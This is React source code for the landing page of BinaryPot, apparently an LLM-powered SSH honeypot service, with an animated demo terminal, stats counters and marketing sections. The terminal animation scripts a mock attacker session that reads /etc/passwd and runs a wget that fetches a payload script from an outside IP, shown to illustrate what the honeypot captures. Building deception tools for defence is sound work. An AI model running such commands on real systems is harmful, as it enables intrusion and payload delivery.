import React, { useEffect, useRef, useState } from "react";
import { Link } from "react-router-dom";
import "./LandingPage.css";

const TERMINAL_LINES = [
  { type: "sys", text: "Connected to BinaryPot v1.0.0" },
  { type: "sys", text: "Recording session BP-04218 · 185.220.101.34" },
  { type: "prompt", text: "root@victim-server:~# whoami" },
  { type: "out", text: "root" },
  { type: "prompt", text: "root@victim-server:~# uname -a" },
  { type: "out", text: "Linux victim-server 5.15.0-1034-aws #38-Ubuntu SMP" },
  { type: "prompt", text: "root@victim-server:~# cat /etc/passwd" },
  { type: "out", text: "root:x:0:0:root:/root:/bin/bash" },
  { type: "out", text: "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin" },
  { type: "prompt", text: "root@victim-server:~# wget http://185.220.101.34/payload.sh" },
  { type: "err", text: "HTTP request sent, awaiting response... 200 OK" },
  { type: "sys", text: "[LLM] Generating realistic response..." },
  { type: "sys", text: "[LOG] Command captured → session BP-04218" },
];

const AnimatedTerminal = () => {
  const [visibleLines, setVisibleLines] = useState([]);
  const [typing, setTyping] = useState("");
  const [lineIdx, setLineIdx] = useState(0);
  const [charIdx, setCharIdx] = useState(0);
  const bodyRef = useRef(null);

  useEffect(() => {
    if (lineIdx >= TERMINAL_LINES.length) {
      const reset = setTimeout(() => {
        setVisibleLines([]);
        setTyping("");
        setLineIdx(0);
        setCharIdx(0);
      }, 2600);
      return () => clearTimeout(reset);
    }

    const line = TERMINAL_LINES[lineIdx];
    const shouldType = line.type === "prompt";

    if (shouldType) {
      if (charIdx < line.text.length) {
        const timer = setTimeout(() => {
          setTyping(line.text.slice(0, charIdx + 1));
          setCharIdx((prev) => prev + 1);
        }, 34);
        return () => clearTimeout(timer);
      }

      const next = setTimeout(() => {
        setVisibleLines((prev) => [...prev, line]);
        setTyping("");
        setCharIdx(0);
        setLineIdx((prev) => prev + 1);
      }, 180);
      return () => clearTimeout(next);
    }

    const timer = setTimeout(() => {
      setVisibleLines((prev) => [...prev, line]);
      setLineIdx((prev) => prev + 1);
    }, 100);

    return () => clearTimeout(timer);
  }, [lineIdx, charIdx]);

  useEffect(() => {
    if (bodyRef.current) {
      bodyRef.current.scrollTop = bodyRef.current.scrollHeight;
    }
  }, [visibleLines, typing]);

  return (
    <div className="bp-terminal">
      <div className="bp-terminal-header">
        <div className="bp-terminal-dots">
          <span className="dot red"></span>
          <span className="dot yellow"></span>
          <span className="dot green"></span>
        </div>
        <div className="bp-terminal-title">root@victim-server:~</div>
        <div className="bp-terminal-live">
          <span className="bp-live-pulse"></span>
          LIVE
        </div>
      </div>

      <div className="bp-terminal-body" ref={bodyRef}>
        {visibleLines.map((line, i) => (
          <div key={i} className={`bp-line ${line.type}`}>
            {line.text}
          </div>
        ))}

        {typing && (
          <div className="bp-line prompt">
            {typing}
            <span className="bp-cursor">█</span>
          </div>
        )}
      </div>
    </div>
  );
};

const CountUp = ({ target, suffix = "" }) => {
  const [value, setValue] = useState(0);
  const ref = useRef(null);

  useEffect(() => {
    const observer = new IntersectionObserver(([entry]) => {
      if (!entry.isIntersecting) return;

      let current = 0;
      const step = target / 55;

      const timer = setInterval(() => {
        current += step;
        if (current >= target) {
          setValue(target);
          clearInterval(timer);
        } else {
          setValue(Math.floor(current));
        }
      }, 18);

      observer.disconnect();
    });

    if (ref.current) observer.observe(ref.current);

    return () => observer.disconnect();
  }, [target]);

  return (
    <span ref={ref}>
      {value.toLocaleString()}
      {suffix}
    </span>
  );
};

const LandingPage = () => {
  return (
    <div className="bp-landing">
      <div className="bp-bg-grid"></div>
      <div className="bp-bg-glow bp-bg-glow-1"></div>
      <div className="bp-bg-glow bp-bg-glow-2"></div>

      <header className="bp-topbar">
        <div className="bp-brand">
          <div className="bp-brand-icon">⬡</div>
          <div className="bp-brand-copy">
            <div className="bp-brand-name">BinaryPot</div>
            <div className="bp-brand-sub">LLM-POWERED SSH HONEYPOT</div>
          </div>
        </div>

        <nav className="bp-nav">
          <a href="#about">About</a>
          <a href="#service">Service</a>
          <a href="#why-binarypot">Why BinaryPot</a>
          <a href="#contact">Contact</a>
        </nav>
      </header>

      <main>
        <section className="bp-hero">
          <div className="bp-hero-grid">
            <div className="bp-hero-copy">
              <div className="bp-eyebrow">
                <span className="bp-eyebrow-dot"></span>
                THREAT INTELLIGENCE · DECEPTION · RESEARCH
              </div>

              <h1 className="bp-hero-title">
                Keep attackers busy.
                <br />
                <span>Capture what matters.</span>
              </h1>

              <p className="bp-hero-text">
                BinaryPot is an LLM-powered SSH honeypot built to look believable,
                hold attacker attention, and reveal real behavior through
                realistic interaction.
              </p>

              <div className="bp-hero-actions">
                <Link to="/signup-request" className="bp-btn bp-btn-primary bp-btn-large">
                  Request Access
                </Link>
                <Link to="/login" className="bp-btn bp-btn-secondary bp-btn-large">
                  Login
                </Link>
              </div>

              <div className="bp-hero-meta">
                <div className="bp-meta-item">
                  <span className="bp-meta-dot live"></span>
                  SSH Listener Active
                </div>
                <div className="bp-meta-item">
                  <span className="bp-meta-dot"></span>
                  LLM Shell Engine
                </div>
                <div className="bp-meta-item">
                  <span className="bp-meta-dot"></span>
                  Full Session Logging
                </div>
              </div>
            </div>

            <div className="bp-hero-visual">
              <AnimatedTerminal />
            </div>
          </div>

          <div className="bp-stats">
            <div className="bp-stat">
              <div className="bp-stat-number">
                <CountUp target={12400} suffix="+" />
              </div>
              <div className="bp-stat-label">Sessions Captured</div>
            </div>

            <div className="bp-stat-divider"></div>

            <div className="bp-stat">
              <div className="bp-stat-number">
                <CountUp target={340} suffix="+" />
              </div>
              <div className="bp-stat-label">Unique Attacker IPs</div>
            </div>

            <div className="bp-stat-divider"></div>

            <div className="bp-stat">
              <div className="bp-stat-number">
                <CountUp target={99} suffix="%" />
              </div>
              <div className="bp-stat-label">Engagement Rate</div>
            </div>

            <div className="bp-stat-divider"></div>

            <div className="bp-stat">
              <div className="bp-stat-number">
                <CountUp target={24} suffix="/7" />
              </div>
              <div className="bp-stat-label">Monitoring</div>
            </div>
          </div>
        </section>

        <section className="bp-section" id="about">
          <div className="bp-section-head">
            <div className="bp-section-tag">{'// ABOUT'}</div>
            <h2 className="bp-section-title">
              A modern honeypot built for <span>real observation</span>
            </h2>
          </div>

          <div className="bp-about-panel">
            <div className="bp-about-card">
              <div className="bp-mini-label">Believable</div>
              <h3>Looks and feels real</h3>
              <p>
                BinaryPot responds like a live Linux environment, making attacker
                interaction feel natural and uninterrupted.
              </p>
            </div>

            <div className="bp-about-card">
              <div className="bp-mini-label">Insightful</div>
              <h3>Captures valuable behavior</h3>
              <p>
                Every command, attempt, and session path becomes useful data for
                research, learning, and defensive improvement.
              </p>
            </div>

            <div className="bp-about-card">
              <div className="bp-mini-label">Focused</div>
              <h3>Designed for security use</h3>
              <p>
                Built for teams, students, and researchers who want clean
                visibility into attacker actions without unnecessary complexity.
              </p>
            </div>
          </div>
        </section>

        <section className="bp-section" id="service">
          <div className="bp-section-head">
            <div className="bp-section-tag">{'// OUR SERVICE'}</div>
            <h2 className="bp-section-title">
              Deception that feels <span>convincing</span>
            </h2>
          </div>

          <div className="bp-service-grid">
            <article className="bp-service-card">
              <div className="bp-service-icon">⬡</div>
              <h3>Realistic SSH deception</h3>
              <p>
                A believable shell experience that keeps suspicious users engaged.
              </p>
            </article>

            <article className="bp-service-card bp-service-card-featured">
              <div className="bp-service-icon">≡</div>
              <h3>Command and session capture</h3>
              <p>
                Log commands, behaviors, and session flow in one clean place.
              </p>
            </article>

            <article className="bp-service-card">
              <div className="bp-service-icon">⚗</div>
              <h3>Research-friendly platform</h3>
              <p>
                Useful for security teams, students, labs, and cyber research.
              </p>
            </article>
          </div>
        </section>

        <section className="bp-section" id="why-binarypot">
          <div className="bp-section-head">
            <div className="bp-section-tag">{'// WHY BINARYPOT'}</div>
            <h2 className="bp-section-title">
              Why people choose <span>BinaryPot</span>
            </h2>
          </div>

          <div className="bp-why-grid">
            <div className="bp-why-card">
              <div className="bp-why-number">01</div>
              <h3>More believable</h3>
              <p>
                Dynamic responses help sessions feel alive instead of scripted.
              </p>
            </div>

            <div className="bp-why-card">
              <div className="bp-why-number">02</div>
              <h3>Better visibility</h3>
              <p>
                Track commands and activity clearly without clutter or confusion.
              </p>
            </div>

            <div className="bp-why-card">
              <div className="bp-why-number">03</div>
              <h3>Made for learning</h3>
              <p>
                Great for research, demonstrations, training, and cybersecurity study.
              </p>
            </div>
          </div>
        </section>

        <section className="bp-section bp-contact-section" id="contact">
          <div className="bp-contact-panel">
            <div className="bp-contact-glow"></div>
            <div className="bp-contact-content">
              <div className="bp-section-tag">{'// CONTACT US'}</div>
              <h2>Ready to explore BinaryPot?</h2>
              <p>
                Request access or email us directly to learn more about BinaryPot.
              </p>

              <div className="bp-contact-actions">
                <a
  href="https://mail.google.com/mail/?view=cm&fs=1&to=binarypot101@gmail.com&su=BinaryPot%20Inquiry"
  className="bp-btn bp-btn-primary bp-btn-large"
  target="_blank"
  rel="noopener noreferrer"
                >
                  binarypot101@gmail.com
                </a>
                <Link to="/signup-request" className="bp-btn bp-btn-secondary bp-btn-large">
                  Request Access
                </Link>
              </div>
            </div>
          </div>
        </section>
      </main>

<footer className="bp-footer">
  <div className="bp-footer-left">
    <span className="bp-footer-brand">⬡ BinaryPot</span>
    <span className="bp-footer-sep">|</span>
    <span className="bp-footer-text">LLM-Powered SSH Honeypot</span>
    <span className="bp-footer-sep">|</span>
    <span className="bp-footer-text">
      © {new Date().getFullYear()} BinaryPot
    </span>
  </div>

  <div className="bp-footer-right">
    <a href="#about" rel="noopener noreferrer">About</a>
    <a href="#contact" rel="noopener noreferrer">Contact</a>
  </div>
</footer>
    </div>
  );
};

export default LandingPage;